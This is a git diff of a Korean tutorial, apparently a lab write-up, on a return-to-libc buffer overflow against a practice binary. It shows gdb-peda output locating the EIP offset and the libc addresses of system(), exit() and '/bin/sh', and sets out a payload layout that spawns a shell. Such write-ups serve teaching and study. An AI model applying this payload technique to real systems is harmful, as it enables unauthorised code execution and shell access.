@@ -38,7 +38,7 @@ int main(int argc, char* argv[])
 
 ![Fig 1. stack][classic1]
 
-## 버퍼의 크기
+## return address 위치 찾기
 우선 버퍼의 크기가 소스코드상에서는 32인데, 실제 Overflow 되어서 EIP가 덮어지는 정확한 지점을 알아야 한다.
 ```
 $ gdb -q ./nxstack
@@ -96,10 +96,11 @@ gdb-peda$ pattern_offset 0x61414145
 ```
 해당 지점은 36이다.
 
-즉, Buffer 가 32로 선언되어있고, 그 뒤에 EBX가 push되어 36칸을 차지하며 그 뒤로는 Return Address 가 위치하는데, 이 부분을 다른 함수의 주소로 덮어씌우면 Return 시에 그 함수를 수행하게 된다.
+즉, Buffer 가 32로 선언되어있고, 그 뒤에 EBX가 push되어(+4) 36칸을 차지하며 그 뒤로는 Return Address 가 위치해야하는데, 이 부분을 다른 함수의 주소로 덮어씌우면 Return 시에 그 함수를 수행하게 된다.
 
-## return address 위치 찾기
 ## system() 의 주소
+익스플로잇은 다양한 작업을 목표로 할 수 있지만 여기에서는 system("/bin/sh")를 수행하도록 할 것이다.
+먼저 system() 을 수행하기 위해 LibC에서 system()이 어디에 위치했는지 찾자.
 ```
 gdb-peda$ p system
 $1 = {<text variable, no debug info>} 0xb7e51b40 <__libc_system>
@@ -107,9 +108,22 @@ $1 = {<text variable, no debug info>} 0xb7e51b40 <__libc_system>
 gdb-peda$ x/s 0xb7e51b40
 0xb7e51b40 <__libc_system>:	"\203\354\f\213D$\020\350\061h\016"
 ```
+이로써 `0xb7e51b40`에 system()이 위치한다는 것을 확인하였다.
+
+## /bin/sh
+system()의 인자로 전달할 값을 스택에 올려두어야 한다. system("/bin/sh")를 수행하도록 할 것이므로 "/bin/sh"이 어디에 있는지 알아야 한다.
+gdb로 대충 아무 부분에 브레이크 포인트 걸어놓고 실행한 상태에서 (동적상태) find 명령어로 "/bin/sh"를 찾자.
+```
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7f748c8 ("/bin/sh")
+```
+이로써 `0xb7f748c8`에 "/bin/sh"이 위치한다는 것을 확인하였다.
+
 ## exit() 주소
 system() 함수가 return되고 난 후 jump할 위치를 지정해야 한다.
-사실 system("/bin/sh")가 호출되는 순간 이미 exploit에 성공했으므로 이 부분은 적당히 Fake 값으로 대충 "AAAA" 로 채워넣어도 무방하다.
+사실 system("/bin/sh")가 호출되는 순간 이미 exploit에 성공했으므로 이 부분은 적당히 Fake 값으로 대충 "BBBB" 로 채워넣어도 무방하기는 하다.
 하지만 차이점이 있다면 쉘 획득 후 작업을 종료하고 나갈 때 Error가 발생한다.
 이 부분까지 깔끔하게 처리하고 싶다면 exit()의 주소를 찾은 후 이것을 호출하게 하면 마치 정상적으로 종료되는 것처럼 보이게 할 수 있다.
 ```
@@ -121,14 +135,19 @@ gdb-peda$ x/s 0xb7e457f0
 ```
 이렇게 얻은 exit()의 주소는 `0xb7e457f0`이다.
 
-## /bin/sh
-system()의 인자로 전달할 브레이크 포인트 걸어놓고 실행한 상태에서
-```
-gdb-peda$ find "/bin/sh"
-Searching for '/bin/sh' in: None ranges
-Found 1 results, display max 1 items:
-libc : 0xb7f748c8 ("/bin/sh")
-```
+## 종합
+스택에 push된 값들은 역순으로 처리된다는 것을 기억해야 한다. 따라서 system()이 수행되고 난 후의 return addr이 먼저 나온다. 그리고 뒤에 system()의 argument인 /bin/sh가 들어간다. 그렇다면 system("/bin/sh")가 수행되고 난 후의 return addr의 내용을 수행하게 된다.
+
+EIP smash = 32 + 4 = 36
+system() = 0xb7e51b40
+system() return address = BBBB (fake word) or exit() 
+/bin/sh = 0xb7f748c8
+|---------------------------|-------------------|--------------|---------------|
+| 36 A's                    | 0xb7e51b40        |     BBBB     | 0xb7f748c8    |
+|---------------------------|-------------------|--------------|---------------|
+                       args        EBP                 EIP 
+
+현재로써는 대충 fake값인 BBBB로 설정해두었다. 또는 `0xb7e457f0`으로 exit()를 EIP부분에 넣으면 좋다.
 
 ## Exploit code
 ```
